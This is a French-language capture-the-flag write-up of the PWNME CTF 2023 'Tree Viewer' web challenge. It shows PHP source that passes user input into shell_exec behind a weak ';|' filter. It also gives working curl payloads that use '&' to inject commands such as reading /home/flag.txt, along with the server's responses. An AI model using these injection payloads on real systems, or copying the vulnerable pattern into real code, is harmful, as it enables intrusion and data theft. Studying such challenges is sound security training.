---
title: "Tree Viewer | PWNME CTF 2023"
date: 2023-05-06T12:00:00Z
description: "Voici un writeup complet du premier challenge web du pwnme ctf"
tags: ["rce","php","injection"]
keywords: ["php", "injection","rce"]
---
[//]: <> (Wrote By Vozec 06/05/2023)
---

# Introduction du challenge:

```
Here, you can check the content of any directories present on the server.
Find a way to abuse this functionality, and read the content of /home/flag.txt
```

# Tree Viewer

Les sources de ce challenges ne sont pas fournies mais nous avons accès en */?source* au code php du backend:  

*http://13.37.17.31:51695/?source*
```html
<?php
$parsed = isset($_POST['input']) ? $_POST['input'] : "/home/";

preg_match_all('/[;|]/m', $parsed, $illegals, PREG_SET_ORDER, 0);
if($illegals){
    echo "Illegals chars found";
    $parsed = "/home/";
}

if(isset($_GET['source'])){
    highlight_file(__FILE__);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tree Viewer</title>
</head>
<body>
    <a href="/?source">Source code</a>
    <hr/>
    <form action="/" method="post">
        <label for="input">Directory to check</label>
    <input type="text" placeholder="Directory to see" id="input" name="input" value="<?= $parsed ?>">
    </form>

    <h3>Content of <?= $parsed ?>: <?= shell_exec('ls '.$parsed); ?></h3>

</body>
</html>
```

On remarque rapidement la vulnérabilité :  

```php
shell_exec('ls '.$parsed);
```

En controlant le paramètre *$parsed*, nous avons une injection de commande dans le ``shell_exec`` ce qui mène à une ``RCE``.

Cette variable est issue du filtre du ``preg_match_all``:  
```php
preg_match_all('/[;|]/m', $parsed, $illegals, PREG_SET_ORDER, 0);
```

Le filtre empêche l'utilisation des charactères : ``;|``.

On peut donc utiliser ``&`` pour exécuter une commande dans ce contexte.

## POC:
```bash
curl -X POST http://13.37.17.31:51695/ --data-urlencode 'input=/home/& echo $(id) &'```
 *Résultats*:  
 ```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tree Viewer</title>
 </head>
 <body>
     <a href="/?source">Source code</a>
     <hr/>
     <form action="/" method="post">
         <label for="input">Directory to check</label>
     <input type="text" placeholder="Directory to see" id="input" name="input" value="/home/& echo $(id) &">
     </form>

     <h3>Content of /home/& echo $(id) &: flag.txt
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </h3>

 </body>
 </html>
 ```


## Flag:
```bash
curl -X POST http://13.37.17.31:51695/ --data-urlencode 'input=/home/& echo $(cat /home/flag.txt) &'
```  

 *Résultats*:  
 ```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tree Viewer</title>
 </head>
 <body>
     <a href="/?source">Source code</a>
     <hr/>
     <form action="/" method="post">
         <label for="input">Directory to check</label>
     <input type="text" placeholder="Directory to see" id="input" name="input" value="/home/& echo $(cat /home/flag.txt) &">
     </form>

     <h3>Content of /home/& echo $(cat /home/flag.txt) &: Flag: PWNME{U53R_1NpU75_1n_5h3lL_3x3c_d3}
 flag.txt
 </h3>

 </body>
 </html>
 ```

```bash
PWNME{U53R_1NpU75_1n_5h3lL_3x3c_d3}
```
